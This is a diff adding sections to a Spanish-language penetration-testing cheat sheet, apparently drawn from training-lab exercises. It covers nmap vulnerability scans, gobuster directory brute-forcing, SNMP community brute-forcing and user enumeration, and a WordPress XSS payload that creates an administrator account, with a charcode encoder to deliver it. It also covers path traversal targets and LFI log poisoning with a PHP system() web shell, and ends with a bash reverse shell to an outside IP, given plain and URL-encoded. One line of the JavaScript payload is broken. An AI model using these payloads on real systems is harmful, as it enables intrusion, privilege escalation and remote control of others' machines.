@@ -60,18 +60,84 @@ sudo nbtscan -r 192.168.50.0/24
 
 # Enumeracion
 
+sudo nmap --script-updatedb
 sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
 sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service
+ sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
 
 ## Directorios
 
 gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 
+
+-w /usr/share/wordlists/dirb/common.txt  
 
 ## Tools
 
 ### Git
 
 https://github.com/arthaud/git-dumper.git
+
+## SNMP
+
+| Identificador | Información |
+|---|---|
+|1.3.6.1.2.1.25.1.6.0 | System Processes
+|1.3.6.1.2.1.25.4.2.1.2 | Running Programs
+|1.3.6.1.2.1.25.4.2.1.4 | Processes Path
+|1.3.6.1.2.1.25.2.3.1.4 | Storage Units
+|1.3.6.1.2.1.25.6.3.1.2 | Software Name
+|1.3.6.1.4.1.77.1.2.25 | User Accounts
+|1.3.6.1.2.1.6.13.1.3 |TCP Local Ports
+
+sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
+
+
+Realiza un bruteforce
+```sh
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
+onesixtyone -c community -i ips
+
+Scanning 254 hosts, 3 communities
+192.168.50.151 [public] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
+COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
+```
+
+```sh
+snmpwalk -c public -v1 -t 10 192.168.50.151
+
+iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
+COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.3
+iso.3.6.1.2.1.1.3.0 = Timeticks: (78235) 0:13:02.35
+iso.3.6.1.2.1.1.4.0 = STRING: "admin@megacorptwo.com"
+iso.3.6.1.2.1.1.5.0 = STRING: "dc01.megacorptwo.com"
+iso.3.6.1.2.1.1.6.0 = ""
+iso.3.6.1.2.1.1.7.0 = INTEGER: 79
+iso.3.6.1.2.1.2.1.0 = INTEGER: 2
+```
+
+Se puede utilizar la tabla para enumerar, por ejemplo usuarios
+
+```sh
+snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
+```
+
+## API
+```sh
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+```
+
+pattern
+
+```sh
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+```
 
 # Password Attacks
 
@@ -354,6 +420,90 @@ run arp_scanner -r 1.1.1.0/24
 use auxiliary/scanner/portscan/tcp
 
 use post/windows/escalate/getsystem
+```
+
+## XXS to Priv Esc
+
+### Wordpress
+
+Payload a utilizar, este crea un usuario y obtiene un nonce que es necesario para la funcion de crear
+
+```js
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+r params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+Codifica el payload, esto se usa para poder evitar problemas a la hora de explotar
+
+```js
+function encode_to_javascript(string) {
+ var input = string
+ var output = '';
+ for(pos = 0; pos < input.length; pos++) {
+ output += input.charCodeAt(pos);
+ if(pos != (input.length - 1)) {
+ output += ",";
+ }
+ }
+ return output;
+ }
+ 
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+```
+
+Se envía el payload, en este caso se usa un proxy
+```sh
+curl -i http://offsecwp --user-agent 
+"<script>eval(String.fromCharCode(118,97,114,32,97,106,97 ... 115,41,59))</script>" --proxy 127.0.0.1:8080
+```
+
+## Path traversal to priv esc (Linux)
+
+home/{user}/.ssh/id_rsa
+/var/log/apache2/access.log
+
+## Path traversal to priv esc (Windows)
+
+
+Si se utiliza IIS, se deberían de revisar los siguientes archivos
+
+C:\inetpub\logs\LogFiles\W3SVC1\.
+C:\inetpub\wwwroot\web.config
+
+## LFI
+
+Si hay un path traversal, se pueden revisar los logs de apache:
+```sh
+ curl 
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+...
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php 
+HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 
+Firefox/91.0"
+```
+
+Podemos enviar la siguiente línea como user agent y este será registrado en el access.log 
+```sh
+<?php echo system($_GET['cmd']); ?>
+```
+
+Volvemos a consultar el access.log
+
+```sh
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 ```
 
 # Pivoting
